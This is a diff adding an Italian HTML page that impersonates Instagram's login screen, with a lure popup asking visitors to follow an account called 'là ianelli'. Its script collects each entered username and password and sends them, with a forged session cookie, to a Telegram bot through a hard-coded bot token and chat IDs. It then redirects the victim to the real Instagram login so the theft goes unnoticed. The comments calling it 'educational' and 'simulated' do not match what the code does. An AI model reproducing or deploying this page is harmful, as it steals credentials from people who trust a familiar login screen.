@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Accedi</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        .form-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin: 4px 0;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 12px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+        button.active {
+            opacity: 1;
+        }
+        .divider {
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 16px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .facebook-login i {
+            font-size: 16px;
+            margin-right: 6px;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .signup-box {
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 8px;
+            text-decoration: none;
+        }
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        #result {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+        .success {
+            background-color: #e6f7ee;
+            color: #009944;
+            border: 1px solid #a3e9c0;
+        }
+        .error {
+            background-color: #fee;
+            color: #d00;
+            border: 1px solid #ffb3b3;
+        }
+        /* Popup stile Instagram */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .popup-message {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .popup-button {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 15px;
+            display: block;
+            border: 2px solid #fff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .follow-button {
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 8px 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .follow-button:active {
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <!-- Popup di segui account -->
+    <div class="popup-overlay" id="followPopup">
+        <div class="popup">
+            <img src="https://i.pinimg.com/222x/33/f6/04/33f6048518c3ee7c459db24f431d11b2.jpg" alt="Foto profilo là ianelli" class="profile-pic">
+            <div class="popup-title">Segui là ianelli</div>
+            <div class="popup-message">
+                Segui là ianelli per vedere i suoi post nella tua bacheca.
+            </div>
+            <button class="popup-button" id="followButton">Segui</button>
+        </div>
+    </div>
+
+    <!-- Popup di login richiesto -->
+    <div class="popup-overlay" id="loginPopup" style="display: none;">
+        <div class="popup">
+            <div class="popup-title">Accesso richiesto</div>
+            <div class="popup-message">
+                Per seguire là ianelli, accedi al tuo account Instagram.
+            </div>
+            <button class="popup-button" id="goToLogin">Accedi</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" name="username" placeholder="Telefono, email o nome utente" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" id="login-button" disabled>Accedi</button>
+                <div id="result"></div>
+            </form>
+            <div class="divider">OPPURE</div>
+            <div class="facebook-login">
+                <i class="fab fa-facebook-square"></i> Accedi con Facebook
+            </div>
+            <div class="forgot-password">Password dimenticata?</div>
+        </div>
+        <div class="signup-box">
+            Non hai un account? <a href="#">Registrati</a>
+        </div>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">Informazioni</a>
+                <a href="#">Blog</a>
+                <a href="#">Lavora con noi</a>
+                <a href="#">Aiuto</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Termini</a>
+                <a href="#">Account migliori</a>
+                <a href="#">Hashtag</a>
+                <a href="#">Località</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Caricamento contatti e non utenti</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram da Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Mostra il popup di segui account all'inizio
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('followPopup').style.display = 'flex';
+            
+            // Quando clicca su Segui
+            document.getElementById('followButton').addEventListener('click', function() {
+                document.getElementById('followPopup').style.display = 'none';
+                document.getElementById('loginPopup').style.display = 'flex';
+            });
+            
+            // Quando clicca su Accedi nel popup di login
+            document.getElementById('goToLogin').addEventListener('click', function() {
+                document.getElementById('loginPopup').style.display = 'none';
+            });
+        });
+
+        // Abilita il pulsante solo se entrambi i campi sono compilati
+        const inputs = document.querySelectorAll('input');
+        const loginButton = document.getElementById('login-button');
+        
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+                loginButton.disabled = !allFilled;
+                loginButton.classList.toggle('active', allFilled);
+            });
+        });
+
+        // Genera un cookie di sessione realistico
+        function generateSessionCookie(username, password) {
+            const timestamp = Math.floor(Date.now() / 1000);
+            const randomHash = btoa(`${username}:${password}:${timestamp}`).replace(/=/g, '');
+            return `sessionid=${randomHash}; Domain=.instagram.com; Secure; HttpOnly; SameSite=Lax`;
+        }
+
+        // Simulazione di verifica delle credenziali (SOLO PER SCOPI EDUCATIVI)
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const resultDiv = document.getElementById('result');
+
+            // Mostra un messaggio di caricamento
+            resultDiv.textContent = "Verifica in corso...";
+            resultDiv.style.display = "block";
+            resultDiv.className = "";
+
+            // Simula una verifica (NON REALE, SOLO PER TEST DIDATTICO)
+            setTimeout(() => {
+                // Simula un controllo casuale (50% di successo)
+                const isSuccess = Math.random() > 0.5;
+                const sessionCookie = generateSessionCookie(username, password);
+                
+                if (isSuccess) {
+                    resultDiv.textContent = "Accesso riuscito (simulazione). Reindirizzamento...";
+                    resultDiv.className = "success";
+                    
+                    // Invia i dati al bot Telegram (SOLO PER SIMULAZIONE)
+                    fetch(`https://api.telegram.org/bot8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: '7850797807',
+                            text: `ACCESSO RIUSCITO (SIMULATO)\nUsername: ${username}\nPassword: ${password}\nCookie di sessione: ${sessionCookie}`
+                        })
+                    });
+                } else {
+                    resultDiv.textContent = "Credenziali non valide (simulazione). Riprova.";
+                    resultDiv.className = "error";
+                    
+                    // Invia i dati al bot Telegram (SOLO PER SIMULAZIONE)
+                    fetch(`https://api.telegram.org/bot8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: '5709299213',
+                            text: `ACCESSO FALLITO (SIMULATO)\nUsername: ${username}\nPassword: ${password}`
+                        })
+                    });
+                }
+
+                // Reindirizza alla pagina ufficiale dopo 3 secondi
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 3000);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
